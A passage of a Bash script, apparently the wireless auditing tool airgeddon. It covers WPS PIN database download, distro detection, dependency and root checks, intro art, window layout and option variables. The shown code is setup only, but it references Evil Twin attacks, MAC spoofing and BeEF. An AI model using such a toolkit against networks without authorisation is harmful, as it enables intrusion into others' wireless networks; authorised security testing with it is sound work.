			if [[ -n "${remote_pindb_file}" ]] && [[ "${remote_pindb_file}" != "${curl_404_error}" ]]; then
				pindb_file_downloaded=1
			fi
		fi
	fi

	if [ "${pindb_file_downloaded}" -eq 1 ]; then
		rm -rf "${scriptfolder}${known_pins_dbfile}" 2> /dev/null
		echo "${remote_pindb_file}" > "${scriptfolder}${known_pins_dbfile}"
		return 0
	else
		return 1
	fi
}

#Ask for try to download pin db file again and set the var to skip it
function ask_for_pin_dbfile_download_retry() {

	debug_print

	ask_yesno 380 "no"
	if [ "${yesno}" = "n" ]; then
		pin_dbfile_checked=1
	fi
}

#Get the checksum for local pin database file
function get_local_pin_dbfile_checksum() {

	debug_print

	local_pin_dbfile_checksum=$(md5sum "${1}" | awk '{print $1}')
}

#Get the checksum for remote pin database file
function get_remote_pin_dbfile_checksum() {

	debug_print

	remote_pin_dbfile_checksum=$(timeout -s SIGTERM 15 curl -L ${urlscript_pins_dbfile_checksum} 2> /dev/null | head -n 1)

	if [[ -n "${remote_pin_dbfile_checksum}" ]] && [[ "${remote_pin_dbfile_checksum}" != "${curl_404_error}" ]]; then
		return 0
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_pin_dbfile_checksum=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_pins_dbfile_checksum} 2> /dev/null | head -n 1)
			if [[ -n "${remote_pin_dbfile_checksum}" ]] && [[ "${remote_pin_dbfile_checksum}" != "${curl_404_error}" ]]; then
				return 0
			fi
		fi
	fi
	return 1
}

#Check for possible non Linux operating systems
function non_linux_os_check() {

	debug_print

	case "${OSTYPE}" in
		solaris*)
			distro="Solaris"
		;;
		darwin*)
			distro="Mac OSX"
		;;
		bsd*)
			distro="FreeBSD"
		;;
	esac
}

#First phase of Linux distro detection based on uname output
function detect_distro_phase1() {

	debug_print

	local possible_distro=""
	for i in "${known_compatible_distros[@]}"; do
		if uname -a | grep -i "${i}" > /dev/null; then
			possible_distro="${i^}"
			if [ "${possible_distro}" != "Arch" ]; then
				if [[ "$(uname -a)" =~ [Rr]pi ]]; then
					distro="Raspberry Pi OS"
				else
					distro="${i^}"
				fi
				break
			else
				if uname -a | grep -i "aarch64" > /dev/null; then
					continue
				else
					distro="${i^}"
					break
				fi
			fi
		fi
	done

	for i in "${known_incompatible_distros[@]}"; do
		if uname -a | grep -i "${i}" > /dev/null; then
			distro="${i^}"
			break
		fi
	done
}

#Second phase of Linux distro detection based on architecture and version file
function detect_distro_phase2() {

	debug_print

	if [ "${distro}" = "Unknown Linux" ]; then
		if [ -f "${osversionfile_dir}centos-release" ]; then
			distro="CentOS"
		elif [ -f "${osversionfile_dir}fedora-release" ]; then
			distro="Fedora"
		elif [ -f "${osversionfile_dir}gentoo-release" ]; then
			distro="Gentoo"
		elif [ -f "${osversionfile_dir}openmandriva-release" ]; then
			distro="OpenMandriva"
		elif [ -f "${osversionfile_dir}redhat-release" ]; then
			distro="Red Hat"
		elif [ -f "${osversionfile_dir}SuSE-release" ]; then
			distro="SuSE"
		elif [ -f "${osversionfile_dir}debian_version" ]; then
			distro="Debian"
			if [ -f "${osversionfile_dir}os-release" ]; then
				extra_os_info="$(grep "PRETTY_NAME" < "${osversionfile_dir}os-release")"
				if [[ "${extra_os_info}" =~ [Rr]aspbian ]]; then
					distro="Raspbian"
					is_arm=1
				elif [[ "${extra_os_info}" =~ [Pp]arrot ]]; then
					distro="Parrot arm"
					is_arm=1
				elif [[ "${extra_os_info}" =~ [Dd]ebian ]] && [[ "$(uname -a)" =~ [Rr]aspberry|[Rr]pi ]]; then
					distro="Raspberry Pi OS"
					is_arm=1
				fi
			fi
		fi
	elif [ "${distro}" = "Arch" ]; then
		if [ -f "${osversionfile_dir}os-release" ]; then
			extra_os_info="$(grep "PRETTY_NAME" < "${osversionfile_dir}os-release")"
			extra_os_info2="$(grep -i "blackarch" < "${osversionfile_dir}issue")"
			if [[ "${extra_os_info}" =~ [Bb]lack[Aa]rch ]] || [[ "${extra_os_info2}" =~ [Bb]lack[Aa]rch ]]; then
				distro="BlackArch"
			fi
		fi
	elif [ "${distro}" = "Ubuntu" ]; then
		if [ -f "${osversionfile_dir}os-release" ]; then
			extra_os_info="$(grep "PRETTY_NAME" < "${osversionfile_dir}os-release")"
			if [[ "${extra_os_info}" =~ [Mm]int ]]; then
				distro="Mint"
			fi
		fi
	fi

	detect_arm_architecture
}

#Detect if arm architecture is present on system
function detect_arm_architecture() {

	debug_print

	distro_already_known=0
	if uname -m | grep -Ei "arm|aarch64" > /dev/null; then

		is_arm=1
		if [ "${distro}" != "Unknown Linux" ]; then
			for item in "${known_arm_compatible_distros[@]}"; do
				if [ "${distro}" = "${item}" ]; then
					distro_already_known=1
				fi
			done
		fi

		if [ "${distro_already_known}" -eq 0 ]; then
			if [ "${distro: -3}" != "arm" ]; then
				distro="${distro} arm"
			fi
		fi
	fi
}

#Set some useful vars based on Linux distro
function special_distro_features() {

	debug_print

	case ${distro} in
		"Wifislax")
			networkmanager_cmd="service restart networkmanager"
			xratio=7
			yratio=15.1
			ywindow_edge_lines=1
			ywindow_edge_pixels=-14
		;;
		"Backbox")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6
			yratio=14.2
			ywindow_edge_lines=1
			ywindow_edge_pixels=15
		;;
		"Ubuntu"|"Mint")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"Kali"|"Kali arm")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"Debian")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=14
		;;
		"SuSE")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=18
		;;
		"CentOS")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=14.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Parrot"|"Parrot arm")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"Arch")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=13.9
			ywindow_edge_lines=2
			ywindow_edge_pixels=16
		;;
		"Fedora")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6
			yratio=14.1
			ywindow_edge_lines=2
			ywindow_edge_pixels=16
		;;
		"Gentoo")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=14.6
			ywindow_edge_lines=1
			ywindow_edge_pixels=-10
		;;
		"Pentoo")
			networkmanager_cmd="rc-service NetworkManager restart"
			xratio=6.2
			yratio=14.6
			ywindow_edge_lines=1
			ywindow_edge_pixels=-10
		;;
		"Red Hat")
			networkmanager_cmd="service NetworkManager restart"
			xratio=6.2
			yratio=15.3
			ywindow_edge_lines=1
			ywindow_edge_pixels=10
		;;
		"Cyborg")
			networkmanager_cmd="service network-manager restart"
			xratio=6.2
			yratio=14.5
			ywindow_edge_lines=2
			ywindow_edge_pixels=10
		;;
		"BlackArch")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=8
			yratio=18
			ywindow_edge_lines=1
			ywindow_edge_pixels=1
		;;
		"Raspbian|Raspberry Pi OS")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=14
			ywindow_edge_lines=1
			ywindow_edge_pixels=20
		;;
		"OpenMandriva")
			networkmanager_cmd="systemctl restart NetworkManager.service"
			xratio=6.2
			yratio=14
			ywindow_edge_lines=2
			ywindow_edge_pixels=-10
		;;
	esac
}

#Determine if NetworkManager must be killed on your system. Only needed for previous versions of 1.0.12
function check_if_kill_needed() {

	debug_print

	nm_min_main_version="1"
	nm_min_subversion="0"
	nm_min_subversion2="12"

	if ! hash NetworkManager 2> /dev/null; then
		check_kill_needed=0
	else
		nm_system_version=$(NetworkManager --version 2> /dev/null)

		if [ "${nm_system_version}" != "" ]; then

			[[ ${nm_system_version} =~ ^([0-9]{1,2})\.([0-9]{1,2})\.?(([0-9]+)|.+)? ]] && nm_main_system_version="${BASH_REMATCH[1]}" && nm_system_subversion="${BASH_REMATCH[2]}" && nm_system_subversion2="${BASH_REMATCH[3]}"

			[[ ${nm_system_subversion2} =~ [a-zA-Z] ]] && nm_system_subversion2="0"

			if [ "${nm_main_system_version}" -lt ${nm_min_main_version} ]; then
				check_kill_needed=1
			elif [ "${nm_main_system_version}" -eq ${nm_min_main_version} ]; then

				if [ "${nm_system_subversion}" -lt ${nm_min_subversion} ]; then
					check_kill_needed=1
				elif [ "${nm_system_subversion}" -eq ${nm_min_subversion} ]; then

					if [ "${nm_system_subversion2}" -lt ${nm_min_subversion2} ]; then
						check_kill_needed=1
					fi
				fi
			fi
		else
			check_kill_needed=1
		fi
	fi
}

#Do some checks for some general configuration
function general_checkings() {

	debug_print

	compatible=0
	check_if_kill_needed

	if [ "${distro}" = "Unknown Linux" ]; then
		non_linux_os_check
		echo -e "${yellow_color}${distro}${normal_color}"
	else
		if [ "${is_docker}" -eq 1 ]; then
			echo -e "${yellow_color}${distro} Linux ${pink_color}(${docker_image[${language}]})${normal_color}"
		else
			echo -e "${yellow_color}${distro} Linux${normal_color}"
		fi
	fi

	check_compatibility
	if [ "${compatible}" -eq 1 ]; then
		return
	fi

	exit_code=1
	exit_script_option
}

#Check if system is running under Windows Subsystem for Linux
check_wsl() {

	debug_print

	if [ "${distro}" = "Microsoft" ]; then
		echo
		language_strings "${language}" 701 "red"
		language_strings "${language}" 115 "read"
		exit_code=1
		exit_script_option
	fi
}

#Check if the user is root
function check_root_permissions() {

	debug_print

	user=$(whoami)

	if [ "${user}" = "root" ]; then
		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo
			language_strings "${language}" 484 "yellow"
		fi
	else
		echo
		language_strings "${language}" 223 "red"
		exit_code=1
		exit_script_option
	fi
}

#Print Linux known distros
#shellcheck disable=SC2207
function print_known_distros() {

	debug_print

	all_known_compatible_distros=("${known_compatible_distros[@]}" "${known_arm_compatible_distros[@]}")
	IFS=$'\n'
	all_known_compatible_distros=($(printf "%s\n" "${all_known_compatible_distros[@]}" | sort))
	unset IFS

	for i in "${all_known_compatible_distros[@]}"; do
		echo -ne "${pink_color}\"${i}\" ${normal_color}"
	done
	echo
}

#Check if you have installed the tools (essential and optional) that the script uses
function check_compatibility() {

	debug_print

	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
		echo
		language_strings "${language}" 108 "blue"
		language_strings "${language}" 115 "read"

		echo
		language_strings "${language}" 109 "blue"
	fi

	essential_toolsok=1
	for i in "${essential_tools_names[@]}"; do
		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo -ne "${i}"
			time_loop
			if ! hash "${i}" 2> /dev/null; then
				echo -ne "${red_color} Error${normal_color}"
				essential_toolsok=0
				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
				echo -e "\r"
			else
				echo -e "${green_color} Ok\r${normal_color}"
			fi
		else
			if ! hash "${i}" 2> /dev/null; then
				essential_toolsok=0
			fi
		fi
	done

	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
		echo
		language_strings "${language}" 218 "blue"
	fi

	optional_toolsok=1
	for i in "${!optional_tools[@]}"; do
		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo -ne "${i}"
			time_loop
		fi
		if ! hash "${i}" 2> /dev/null; then
			if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
				echo -ne "${red_color} Error${normal_color}"
				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
				echo -e "\r"
			fi
			optional_toolsok=0
		else
			if [ "${i}" = "beef" ]; then
				detect_fake_beef
				if [ "${fake_beef_found}" -eq 1 ]; then
					if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
						echo -ne "${red_color} Error${normal_color}"
						echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
						echo -e "\r"
					fi
					optional_toolsok=0
				else
					if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
						echo -e "${green_color} Ok\r${normal_color}"
					fi
					optional_tools[${i}]=1
				fi
			else
				if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
					echo -e "${green_color} Ok\r${normal_color}"
				fi
				optional_tools[${i}]=1
			fi
		fi
	done

	update_toolsok=1
	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then

		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo
			language_strings "${language}" 226 "blue"
		fi

		for i in "${update_tools[@]}"; do
			if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
				echo -ne "${i}"
				time_loop
				if ! hash "${i}" 2> /dev/null; then
					echo -ne "${red_color} Error${normal_color}"
					update_toolsok=0
					echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
					echo -e "\r"
				else
					echo -e "${green_color} Ok\r${normal_color}"
				fi
			else
				if ! hash "${i}" 2> /dev/null; then
					update_toolsok=0
				fi
			fi
		done
	fi

	if [ "${essential_toolsok}" -eq 0 ]; then
		echo
		language_strings "${language}" 111 "red"
		echo
		if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
			language_strings "${language}" 581 "blue"
			echo
		fi
		language_strings "${language}" 115 "read"
		return
	fi

	compatible=1

	if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
		if [ "${optional_toolsok}" -eq 0 ]; then
			echo
			language_strings "${language}" 219 "yellow"

			if [ "${fake_beef_found}" -eq 1 ]; then
				echo
				language_strings "${language}" 401 "red"
				echo
			fi
			return
		fi

		echo
		language_strings "${language}" 110 "yellow"
	fi
}

#Check for the minimum bash version requirement
function check_bash_version() {

	debug_print

	bashversion="${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"
	if compare_floats_greater_or_equal "${bashversion}" ${minimum_bash_version_required}; then
		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
			echo
			language_strings "${language}" 221 "yellow"
		fi
	else
		echo
		language_strings "${language}" 222 "red"
		exit_code=1
		exit_script_option
	fi
}

#Check if you have installed the tools required to update the script
function check_update_tools() {

	debug_print

	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
		if [ "${is_docker}" -eq 1 ]; then
			echo
			language_strings "${language}" 422 "blue"
			language_strings "${language}" 115 "read"
		else
			if [ "${update_toolsok}" -eq 1 ]; then
				autoupdate_check
			else
				echo
				language_strings "${language}" 225 "yellow"
				language_strings "${language}" 115 "read"
			fi
		fi
	fi
}

#Check if window size is enough for intro
function check_window_size_for_intro() {

	debug_print

	window_width=$(tput cols)
	window_height=$(tput lines)

	if [ "${window_width}" -lt 69 ]; then
		return 1
	elif [[ "${window_width}" -ge 69 ]] && [[ "${window_width}" -le 80 ]]; then
		if [ "${window_height}" -lt 20 ]; then
			return 1
		fi
	else
		if [ "${window_height}" -lt 19 ]; then
			return 1
		fi
	fi

	return 0
}

#Print the script intro
function print_intro() {

	debug_print

	echo -e "${yellow_color}                  .__                         .___  .___"
	sleep 0.15 && echo -e "           _____  |__|______  ____   ____   __| _/__| _/____   ____"
	sleep 0.15 && echo -e "           \__  \ |  \_  __ \/ ___\_/ __ \ / __ |/ __ |/  _ \ /    \\"
	sleep 0.15 && echo -e "            / __ \|  ||  | \/ /_/  >  ___// /_/ / /_/ (  <_> )   |  \\"
	sleep 0.15 && echo -e "           (____  /__||__|  \___  / \___  >____ \____ |\____/|___|  /"
	sleep 0.15 && echo -e "                \/         /_____/      \/     \/    \/           \/${normal_color}"
	echo
	language_strings "${language}" 228 "green"
	print_animated_flying_saucer
	sleep 1
}

#Generate the frames of the animated ascii art flying saucer
function flying_saucer() {

	debug_print

	case ${1} in
		1)
			echo "                                                             "
			echo "                         .   *       _.---._  *              "
			echo "                                   .'       '.       .       "
			echo "                               _.-~===========~-._          *"
			echo "                           *  (___________________)     .    "
			echo "                       .     .      \_______/    *           "
		;;
		2)
			echo "                        *         .  _.---._          .      "
			echo "                              *    .'       '.  .            "
			echo "                               _.-~===========~-._ *         "
			echo "                           .  (___________________)       *  "
			echo "                            *       \_______/        .       "
			echo "                                                             "
		;;
		3)
			echo "                                   *                .        "
			echo "                             *       _.---._              *  "
			echo "                          .        .'       '.       *       "
			echo "                       .       _.-~===========~-._     *     "
			echo "                              (___________________)         ."
			echo "                       *            \_______/ .              "
		;;
		4)
			echo "                        *         .  _.---._          .      "
			echo "                              *    .'       '.  .            "
			echo "                               _.-~===========~-._ *         "
			echo "                           .  (___________________)       *  "
			echo "                            *       \_______/        .       "
			echo "                                                             "
		;;
	esac
	sleep 0.4
}

#Print animated ascii art flying saucer
function print_animated_flying_saucer() {

	debug_print

	echo -e "\033[6B"

	for i in $(seq 1 8); do
		echo -e "\033[7A"
		if [ "${i}" -le 4 ]; then
			saucer_frame=${i}
		else
			saucer_frame=$((i-4))
		fi
		flying_saucer "${saucer_frame}"
	done
}

#Initialize script settings
function initialize_script_settings() {

	debug_print

	distro="Unknown Linux"
	is_docker=0
	exit_code=0
	check_kill_needed=0
	nm_processes_killed=0
	airmon_fix
	autochanged_language=0
	routing_modified=0
	spoofed_mac=0
	mac_spoofing_desired=0
	dhcpd_path_changed=0
	xratio=6.2
	yratio=13.9
	ywindow_edge_lines=2
	ywindow_edge_pixels=18
	networkmanager_cmd="service network-manager restart"
	is_arm=0
	pin_dbfile_checked=0
	beef_found=0
	fake_beef_found=0
	advanced_captive_portal=0
	set_script_paths
	http_proxy_set=0
	hccapx_needed=0
	hcx_conversion_needed=0
	xterm_ok=1
	graphics_system=""
	interface_airmon_compatible=1
	secondary_interface_airmon_compatible=1
	declare -gA wps_data_array
	declare -gA interfaces_band_info
	tmux_error=0
	custom_certificates_country=""
	custom_certificates_state=""
	custom_certificates_locale=""
	custom_certificates_organization=""
	custom_certificates_email=""
	custom_certificates_cn=""
	card_vif_support=0
	country_code="00"
	clean_all_iptables_nftables=1
	right_arping=0
	right_arping_command="arping"
	capture_traps_in_progress=""
}

#Detect graphics system
function graphics_prerequisites() {

	debug_print

	if [ "${is_docker}" -eq 0 ]; then
		if hash loginctl 2> /dev/null && [[ ! "$(loginctl 2>&1)" =~ not[[:blank:]]been[[:blank:]]booted[[:blank:]]with[[:blank:]]systemd|Host[[:blank:]]is[[:blank:]]down ]]; then
			graphics_system=$(loginctl show-session "$(loginctl 2> /dev/null | awk 'FNR == 2 {print $1}')" -p Type 2> /dev/null | awk -F "=" '{print $2}')
		else
			if [ -z "${XDG_SESSION_TYPE}" ]; then
				if [ -n "${XDG_CURRENT_DESKTOP}" ]; then
					graphics_system="x11"
				fi
			else
				graphics_system="${XDG_SESSION_TYPE}"
			fi
		fi
	else
		graphics_system="${XDG_SESSION_TYPE}"
	fi
}

#Detect if there is a working graphics system
function check_graphics_system() {

	debug_print

	case "${graphics_system}" in
		"x11"|"wayland")
			if hash xset 2> /dev/null; then
				if ! xset -q > /dev/null 2>&1; then
					xterm_ok=0
				fi
			fi
		;;
		"tty"|*)
			if [ -z "${XAUTHORITY}" ]; then
				xterm_ok=0
				if hash xset 2> /dev/null; then
					if xset -q > /dev/null 2>&1; then
						xterm_ok=1
					fi
				fi
			fi
		;;
	esac
}

#Detect screen resolution if possible
function detect_screen_resolution() {

	debug_print

	resolution_detected=0
	if hash xdpyinfo 2> /dev/null; then
		if resolution=$(xdpyinfo 2> /dev/null | grep -A 3 "screen #0" | grep "dimensions" | tr -s " " | cut -d " " -f 3 | grep "x"); then
			resolution_detected=1
		fi
	fi

	if [ "${resolution_detected}" -eq 0 ]; then
		resolution=${standard_resolution}
	fi

	[[ ${resolution} =~ ^([0-9]{3,4})x(([0-9]{3,4}))$ ]] && resolution_x="${BASH_REMATCH[1]}" && resolution_y="${BASH_REMATCH[2]}"
}

#Set windows sizes and positions
function set_windows_sizes() {

	debug_print

	set_xsizes
	set_ysizes
	set_ypositions

	g1_topleft_window="${xwindow}x${ywindowhalf}+0+0"
	g1_bottomleft_window="${xwindow}x${ywindowhalf}+0-0"
	g1_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g1_bottomright_window="${xwindow}x${ywindowhalf}-0-0"

	g2_stdleft_window="${xwindow}x${ywindowone}+0+0"
	g2_stdright_window="${xwindow}x${ywindowone}-0+0"

	g3_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g3_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
	g3_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g3_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g3_bottomright_window="${xwindow}x${ywindowhalf}-0-0"

	g4_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g4_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
	g4_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g4_topright_window="${xwindow}x${ywindowthird}-0+0"
	g4_middleright_window="${xwindow}x${ywindowthird}-0+${second_of_three_position}"
	g4_bottomright_window="${xwindow}x${ywindowthird}-0-0"

	g5_left1="${xwindow}x${ywindowseventh}+0+0"
	g5_left2="${xwindow}x${ywindowseventh}+0+${second_of_seven_position}"
	g5_left3="${xwindow}x${ywindowseventh}+0+${third_of_seven_position}"
	g5_left4="${xwindow}x${ywindowseventh}+0+${fourth_of_seven_position}"
	g5_left5="${xwindow}x${ywindowseventh}+0+${fifth_of_seven_position}"
	g5_left6="${xwindow}x${ywindowseventh}+0+${sixth_of_seven_position}"
	g5_left7="${xwindow}x${ywindowseventh}+0+${seventh_of_seven_position}"
	g5_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g5_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
}

#Set sizes for x-axis
function set_xsizes() {

	debug_print

	xtotal=$(awk -v n1="${resolution_x}" "BEGIN{print n1 / ${xratio}}")

	if ! xtotaltmp=$(printf "%.0f" "${xtotal}" 2> /dev/null); then
		dec_char=","
		xtotal="${xtotal/./${dec_char}}"
		xtotal=$(printf "%.0f" "${xtotal}" 2> /dev/null)
	else
		xtotal=${xtotaltmp}
	fi

	xcentral_space=$((xtotal * 5 / 100))
	xhalf=$((xtotal / 2))
	xwindow=$((xhalf - xcentral_space))
}

#Set sizes for y axis
function set_ysizes() {

	debug_print

	ytotal=$(awk -v n1="${resolution_y}" "BEGIN{print n1 / ${yratio}}")
	if ! ytotaltmp=$(printf "%.0f" "${ytotal}" 2> /dev/null); then
		dec_char=","
		ytotal="${ytotal/./${dec_char}}"
		ytotal=$(printf "%.0f" "${ytotal}" 2> /dev/null)
	else
		ytotal=${ytotaltmp}
	fi

	ywindowone=$((ytotal - ywindow_edge_lines))
	ywindowhalf=$((ytotal / 2 - ywindow_edge_lines))
	ywindowthird=$((ytotal / 3 - ywindow_edge_lines))
	ywindowseventh=$((ytotal / 7 - ywindow_edge_lines))
}

#Set positions for y-axis
function set_ypositions() {

	debug_print

	second_of_three_position=$((resolution_y / 3 + ywindow_edge_pixels))

	second_of_seven_position=$((resolution_y / 7 + ywindow_edge_pixels))
	third_of_seven_position=$((resolution_y / 7 + resolution_y / 7 + ywindow_edge_pixels))
	fourth_of_seven_position=$((resolution_y / 7 + 2 * (resolution_y / 7) + ywindow_edge_pixels))
	fifth_of_seven_position=$((resolution_y / 7 + 3 * (resolution_y / 7) + ywindow_edge_pixels))
	sixth_of_seven_position=$((resolution_y / 7 + 4 * (resolution_y / 7) + ywindow_edge_pixels))
	seventh_of_seven_position=$((resolution_y / 7 + 5 * (resolution_y / 7) + ywindow_edge_pixels))
}

#Recalculate windows sizes and positions
function recalculate_windows_sizes() {

	debug_print

	detect_screen_resolution
	set_windows_sizes
}

#Initialization of env vars
#shellcheck disable=SC2145
function env_vars_initialization() {

	ordered_options_env_vars=(
									"AIRGEDDON_AUTO_UPDATE" #0
									"AIRGEDDON_SKIP_INTRO" #1
									"AIRGEDDON_BASIC_COLORS" #2
									"AIRGEDDON_EXTENDED_COLORS" #3
									"AIRGEDDON_AUTO_CHANGE_LANGUAGE" #4
									"AIRGEDDON_SILENT_CHECKS" #5
									"AIRGEDDON_PRINT_HINTS" #6
									"AIRGEDDON_5GHZ_ENABLED" #7
									#TODO add AIRGEDDON_6GHZ_ENABLED
									"AIRGEDDON_FORCE_IPTABLES" #8
									"AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING" #9
									"AIRGEDDON_MDK_VERSION" #10
									"AIRGEDDON_PLUGINS_ENABLED" #11
									"AIRGEDDON_DEVELOPMENT_MODE" #12
									"AIRGEDDON_DEBUG_MODE" #13
									"AIRGEDDON_WINDOWS_HANDLING" #14
									)

	declare -gA nonboolean_options_env_vars
	nonboolean_options_env_vars["${ordered_options_env_vars[10]},default_value"]="mdk4" #mdk_version
	nonboolean_options_env_vars["${ordered_options_env_vars[14]},default_value"]="xterm" #windows_handling

	nonboolean_options_env_vars["${ordered_options_env_vars[10]},rcfile_text"]="#Available values: mdk3, mdk4 - Define which mdk version is going to be used - Default value ${nonboolean_options_env_vars[${ordered_options_env_vars[10]},'default_value']}"
	nonboolean_options_env_vars["${ordered_options_env_vars[14]},rcfile_text"]="#Available values: xterm, tmux - Define the needed tool to be used for windows handling - Default value ${nonboolean_options_env_vars[${ordered_options_env_vars[14]},'default_value']}"

	declare -gA boolean_options_env_vars
	boolean_options_env_vars["${ordered_options_env_vars[0]},default_value"]="true" #auto_update
	boolean_options_env_vars["${ordered_options_env_vars[1]},default_value"]="false" #skip_intro
	boolean_options_env_vars["${ordered_options_env_vars[2]},default_value"]="true" #basic_colors
	boolean_options_env_vars["${ordered_options_env_vars[3]},default_value"]="true" #extended_colors
	boolean_options_env_vars["${ordered_options_env_vars[4]},default_value"]="true" #auto_change_language
	boolean_options_env_vars["${ordered_options_env_vars[5]},default_value"]="false" #silent_checks
	boolean_options_env_vars["${ordered_options_env_vars[6]},default_value"]="true" #print_hints
	boolean_options_env_vars["${ordered_options_env_vars[7]},default_value"]="true" #5ghz_enabled
	boolean_options_env_vars["${ordered_options_env_vars[8]},default_value"]="false" #force_iptables
	boolean_options_env_vars["${ordered_options_env_vars[9]},default_value"]="true" #force_network_manager_killing
	boolean_options_env_vars["${ordered_options_env_vars[11]},default_value"]="true" #plugins_enabled
	boolean_options_env_vars["${ordered_options_env_vars[12]},default_value"]="false" #development_mode
	boolean_options_env_vars["${ordered_options_env_vars[13]},default_value"]="false" #debug_mode

	boolean_options_env_vars["${ordered_options_env_vars[0]},rcfile_text"]="#Enabled true / Disabled false - Auto update feature (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[0]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[1]},rcfile_text"]="#Enabled true / Disabled false - Skip intro (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[1]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[2]},rcfile_text"]="#Enabled true / Disabled false - Allow colorized output - Default value ${boolean_options_env_vars[${ordered_options_env_vars[2]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[3]},rcfile_text"]="#Enabled true / Disabled false - Allow extended colorized output (ccze tool needed, it has no effect on disabled basic colors) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[3]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[4]},rcfile_text"]="#Enabled true / Disabled false - Auto change language feature - Default value ${boolean_options_env_vars[${ordered_options_env_vars[4]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[5]},rcfile_text"]="#Enabled true / Disabled false - Dependencies, root and bash version checks are done silently (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[5]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[6]},rcfile_text"]="#Enabled true / Disabled false - Print help hints on menus - Default value ${boolean_options_env_vars[${ordered_options_env_vars[6]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[7]},rcfile_text"]="#Enabled true / Disabled false - Enable 5Ghz support (it has no effect if your cards are not 5Ghz compatible cards) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[7]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[8]},rcfile_text"]="#Enabled true / Disabled false - Force to use iptables instead of nftables (it has no effect if nftables are not present) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[8]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[9]},rcfile_text"]="#Enabled true / Disabled false - Force to kill Network Manager before launching Evil Twin attacks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[9]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[11]},rcfile_text"]="#Enabled true / Disabled false - Enable plugins system - Default value ${boolean_options_env_vars[${ordered_options_env_vars[11]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[12]},rcfile_text"]="#Enabled true / Disabled false - Development mode for faster development skipping intro and all initial checks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[12]},'default_value']}"
	boolean_options_env_vars["${ordered_options_env_vars[13]},rcfile_text"]="#Enabled true / Disabled false - Debug mode for development printing debug information - Default value ${boolean_options_env_vars[${ordered_options_env_vars[13]},'default_value']}"

	readarray -t ENV_VARS_ELEMENTS < <(printf %s\\n "${!nonboolean_options_env_vars[@]} ${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
